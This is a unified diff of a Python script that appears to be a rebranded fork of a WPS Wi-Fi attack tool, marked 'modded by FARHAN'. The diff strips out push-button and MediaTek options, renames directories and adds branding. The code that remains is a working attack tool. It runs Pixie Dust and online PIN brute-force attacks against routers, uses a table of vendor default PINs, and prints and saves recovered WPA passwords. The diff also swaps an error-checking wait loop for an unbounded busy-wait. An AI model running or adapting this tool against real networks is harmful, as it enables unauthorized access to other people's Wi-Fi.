@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# credit bt me farhan
+#Open Source Code.No Need More Modification.
+# credit by me farhan
 import sys
 import subprocess
 import os
@@ -15,9 +16,9 @@ from datetime import datetime
 import collections
 import statistics
 import csv
-from pathlib import Path
 from typing import Dict
-os.system('cls||clear') 
+
+os.system('cls||clear')
 print("""\033[1;32m
 
 ███████╗██████╗░███╗░░██╗░░░░░░░██╗░░░░░░░██╗██╗███████╗██╗
@@ -146,7 +147,6 @@ class WPSpin:
                       'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
                       'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
                       'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}}
-
 
     @staticmethod
     def checksum(pin):
@@ -445,8 +445,8 @@ class Companion:
         self.connection_status = ConnectionStatus()
 
         user_home = str(pathlib.Path.home())
-        self.sessions_dir = f'{user_home}/.FARHAN-Shot2/sessions/'
-        self.pixiewps_dir = f'{user_home}/.FARHAN-Shot2/pixiewps/'
+        self.sessions_dir = f'{user_home}/.BiRi/sessions/'
+        self.pixiewps_dir = f'{user_home}/.BiRi/pixiewps/'
         self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
         if not os.path.exists(self.sessions_dir):
             os.makedirs(self.sessions_dir)
@@ -461,13 +461,8 @@ class Companion:
         self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                      stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
         # Waiting for wpa_supplicant control interface initialization
-        while True:
-            ret = self.wpas.poll()
-            if ret is not None and ret != 0:
-                raise ValueError('wpa_supplicant returned an error: ' + self.wpas.communicate()[0])
-            if os.path.exists(self.wpas_ctrl_path):
-                break
-            time.sleep(.1)
+        while not os.path.exists(self.wpas_ctrl_path):
+            pass
 
     def sendOnly(self, command):
         """Sends command to wpa_supplicant"""
@@ -480,15 +475,7 @@ class Companion:
         inmsg = b.decode('utf-8', errors='replace')
         return inmsg
 
-    @staticmethod
-    def _explain_wpas_not_ok_status(command: str, respond: str):
-        if command.startswith(('WPS_REG', 'WPS_PBC')):
-            if respond == 'UNKNOWN COMMAND':
-                return ('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
-                        'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
-        return '[!] Something went wrong — check out debug log'
-
-    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None):
+    def __handle_wpas(self, pixiemode=False, verbose=None):
         if not verbose:
             verbose = self.print_debug
         line = self.wpas.stdout.readline()
@@ -582,10 +569,6 @@ class Companion:
             print('[*] Received Identity Request')
         elif 'using real identity' in line:
             print('[*] Sending Identity Response…')
-        elif pbc_mode and ('selected BSS ' in line):
-            bssid = line.split('selected BSS ')[-1].split()[0].upper()
-            self.connection_status.bssid = bssid
-            print('[*] Selected AP: {}'.format(bssid))
 
         return True
 
@@ -665,30 +648,25 @@ class Companion:
             return None
         return pin
 
-    def __wps_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, verbose=None):
+    def __wps_connection(self, bssid, pin, pixiemode=False, verbose=None):
         if not verbose:
             verbose = self.print_debug
         self.pixie_creds.clear()
         self.connection_status.clear()
         self.wpas.stdout.read(300)   # Clean the pipe
-        if pbc_mode:
-            if bssid:
-                print(f"[*] Starting WPS push button connection to {bssid}…")
-                cmd = f'WPS_PBC {bssid}'
-            else:
-                print("[*] Starting WPS push button connection…")
-                cmd = 'WPS_PBC'
-        else:
-            print(f"[*] Trying PIN '{pin}'…")
-            cmd = f'WPS_REG {bssid} {pin}'
-        r = self.sendAndReceive(cmd)
+        print(f"[*] Trying PIN '{pin}'…")
+        r = self.sendAndReceive(f'WPS_REG {bssid} {pin}')
         if 'OK' not in r:
             self.connection_status.status = 'WPS_FAIL'
-            print(self._explain_wpas_not_ok_status(cmd, r))
+            if r == 'UNKNOWN COMMAND':
+                print('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
+                      'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
+            else:
+                print('[!] Something went wrong — check out debug log')
             return False
 
         while True:
-            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose)
+            res = self.__handle_wpas(pixiemode=pixiemode, verbose=verbose)
             if not res:
                 break
             if self.connection_status.status == 'WSC_NACK':
@@ -701,7 +679,7 @@ class Companion:
         self.sendOnly('WPS_CANCEL')
         return False
 
-    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
+    def single_connection(self, bssid, pin=None, pixiemode=False, showpixiecmd=False,
                           pixieforce=False, store_pin_on_fail=False):
         if not pin:
             if pixiemode:
@@ -716,14 +694,11 @@ class Companion:
                             raise FileNotFoundError
                 except FileNotFoundError:
                     pin = self.generator.getLikely(bssid) or '12345670'
-            elif not pbc_mode:
+            else:
                 # If not pixiemode, ask user to select a pin from the list
                 pin = self.__prompt_wpspin(bssid) or '12345670'
-        if pbc_mode:
-            self.__wps_connection(bssid, pbc_mode=pbc_mode)
-            bssid = self.connection_status.bssid
-            pin = '<PBC mode>'
-        elif store_pin_on_fail:
+
+        if store_pin_on_fail:
             try:
                 self.__wps_connection(bssid, pin, pixiemode)
             except KeyboardInterrupt:
@@ -737,13 +712,12 @@ class Companion:
             self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
             if self.save_result:
                 self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
-            if not pbc_mode:
-                # Try to remove temporary PIN file
-                filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
-                try:
-                    os.remove(filename)
-                except FileNotFoundError:
-                    pass
+            # Try to remove temporary PIN file
+            filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
+            try:
+                os.remove(filename)
+            except FileNotFoundError:
+                pass
             return True
         elif pixiemode:
             if self.pixie_creds.got_all():
@@ -831,7 +805,7 @@ class Companion:
                 self.__second_half_bruteforce(bssid, f_half, s_half, delay)
             raise KeyboardInterrupt
         except KeyboardInterrupt:
-            print("\nAborting…")
+            print("\nAborting…\nStay With\nFARHAN")
             filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
             with open(filename, 'w') as file:
                 file.write(self.bruteforce.mask)
@@ -1075,7 +1049,7 @@ def die(msg):
 
 def usage():
     return """
-FARHAN-Shot2Pin 0.0.2 (c) 2017 rofl0r, modded by FARHAN
+Shot2Pin 0.0.2 (c) 2017 rofl0r, modded by FARHAN
 
 %(prog)s <arguments>
 
@@ -1087,7 +1061,6 @@ Optional arguments:
     -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
     -K, --pixie-dust         : Run Pixie Dust attack
     -B, --bruteforce         : Run online bruteforce attack
-    --push-button-connect    : Run WPS push button connection
 
 Advanced arguments:
     -d, --delay=<n>          : Set the delay between pin attempts [0]
@@ -1098,8 +1071,6 @@ Advanced arguments:
     --iface-down             : Down network interface when the work is finished
     -l, --loop               : Run in a loop
     -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
-    --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
-                               (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
     -v, --verbose            : Verbose output
 
 Example:
@@ -1111,7 +1082,7 @@ if __name__ == '__main__':
     import argparse
 
     parser = argparse.ArgumentParser(
-        description='FARHAN-Shot2Pin 0.0.2 (c) 2017 rofl0r, modded by FARHAN',
+        description='Shot2Pin 0.0.2 (c) 2017 rofl0r, modded by FARHAN',
         epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K'
         )
 
@@ -1152,11 +1123,6 @@ if __name__ == '__main__':
         help='Run online bruteforce attack'
         )
     parser.add_argument(
-        '--pbc', '--push-button-connect',
-        action='store_true',
-        help='Run WPS push button connection'
-        )
-    parser.add_argument(
         '-d', '--delay',
         type=float,
         help='Set the delay between pin attempts'
@@ -1188,13 +1154,6 @@ if __name__ == '__main__':
         help='Reverse order of networks in the list of networks. Useful on small displays'
     )
     parser.add_argument(
-        '--mtk-wifi',
-        action='store_true',
-        help='Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit '
-             '(for internal Wi-Fi adapters implemented in MediaTek SoCs). '
-             'Turn off Wi-Fi in the system settings before using this.'
-    )
-    parser.add_argument(
         '-v', '--verbose',
         action='store_true',
         help='Verbose output'
@@ -1207,41 +1166,29 @@ if __name__ == '__main__':
     if os.getuid() != 0:
         die("Run it as root")
 
-    if args.mtk_wifi:
-        wmtWifi_device = Path("/dev/wmtWifi")
-        if not wmtWifi_device.is_char_device():
-            die("Unable to activate MediaTek Wi-Fi interface device (--mtk-wifi): "
-                "/dev/wmtWifi does not exist or it is not a character device")
-        wmtWifi_device.chmod(0o644)
-        wmtWifi_device.write_text("1")
-
     if not ifaceUp(args.interface):
         die('Unable to up interface "{}"'.format(args.interface))
 
     while True:
         try:
-            companion = Companion(args.interface, args.write, print_debug=args.verbose)
-            if args.pbc:
-                companion.single_connection(pbc_mode=True)
-            else:
-                if not args.bssid:
-                    try:
-                        with open(args.vuln_list, 'r', encoding='utf-8') as file:
-                            vuln_list = file.read().splitlines()
-                    except FileNotFoundError:
-                        vuln_list = []
-                    scanner = WiFiScanner(args.interface, vuln_list)
-                    if not args.loop:
-                        print('[*] BSSID not specified (--bssid) — scanning for available networks')
-                    args.bssid = scanner.prompt_network()
+            if not args.bssid:
+                try:
+                    with open(args.vuln_list, 'r', encoding='utf-8') as file:
+                        vuln_list = file.read().splitlines()
+                except FileNotFoundError:
+                    vuln_list = []
+                scanner = WiFiScanner(args.interface, vuln_list)
+                if not args.loop:
+                    print('[*] BSSID not specified (--bssid) — scanning for available networks')
+                args.bssid = scanner.prompt_network()
 
-                if args.bssid:
-                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
-                    if args.bruteforce:
-                        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
-                    else:
-                        companion.single_connection(args.bssid, args.pin, args.pixie_dust,
-                                                    args.show_pixie_cmd, args.pixie_force)
+            if args.bssid:
+                companion = Companion(args.interface, args.write, print_debug=args.verbose)
+                if args.bruteforce:
+                    companion.smart_bruteforce(args.bssid, args.pin, args.delay)
+                else:
+                    companion.single_connection(args.bssid, args.pin, args.pixie_dust,
+                                                args.show_pixie_cmd, args.pixie_force)
             if not args.loop:
                 break
             else:
@@ -1249,16 +1196,13 @@ if __name__ == '__main__':
         except KeyboardInterrupt:
             if args.loop:
                 if input("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
-                    print("Aborting…")
+                    print("Aborting…\nStay With\nFARHAN")
                     break
                 else:
                     args.bssid = None
             else:
-                print("\nAborting…")
+                print("\nAborting…\nStay With\nFARHAN")
                 break
 
     if args.iface_down:
         ifaceUp(args.interface, down=True)
-
-    if args.mtk_wifi:
-        wmtWifi_device.write_text("0")
